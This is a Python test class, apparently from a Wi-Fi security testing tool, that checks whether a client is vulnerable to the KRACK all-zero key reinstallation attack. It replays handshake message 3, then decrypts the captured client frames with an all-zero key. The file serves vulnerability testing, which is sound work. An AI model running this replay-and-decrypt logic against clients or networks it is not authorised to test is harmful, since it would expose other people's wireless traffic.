class ExampleKrackZerokey(Test):
	"""Test if a client is vulnerable to an all-zero key reinstallation attack."""
	name = "example-krack-zero-key"
	kind = Test.Authenticator
	
	def __init__(self):
		super().__init__([
			# Replay 4-Way Handshake Message 3/4.
			Action( trigger=Trigger.Connected, action=Action.Function ),
			# Receive all frames and search for one encrypted with an all-zero key.
			Action( trigger=Trigger.NoTrigger, action=Action.Receive ),
			# When we receive such a frame, we can terminate the test.
			Action( trigger=Trigger.Received, action=Action.Terminate )
		])


	def resend(self, station):
		# Resend 4-Way Handshake Message 3/4.
		# https://w1.fi/cgit/hostap/plain/tests/cipher-and-key-mgmt-testing.txt
		station.wpaspy_command("RESEND_M3 " + station.clientmac )


	def receive(self, station, frame):
		if frame[Dot11].addr2 != station.clientmac:
			return False
		if not frame.haslayer(Dot11CCMP):
			return False
		# We now received a CCMP-encrypted frame from our client.
		# Let us try to decrypt it with an all-zero key.
		key = b"\x00"*16
		plaintext = decrypt_ccmp(frame.getlayer(Dot11),tk=key)
		if plaintext is None: return False
		# We received a valid plaintext frame!
		log(STATUS, plaintext.summary(), color="orange")
		log(STATUS,'Client encrypted a frame with an all-zero key!', color="green")
		return True


	def generate(self, station):
	
		# Force the client to reinstall the pairwise key.
		self.actions[0].set_function( self.resend )
		self.actions[0].set_delay( 2 )

		# Now let us receive all frames and test for all-zero encryption keys.
		self.actions[1].set_receive( self.receive , mon=True )


# ----------------------------------- Control Interface Examples ----------------------

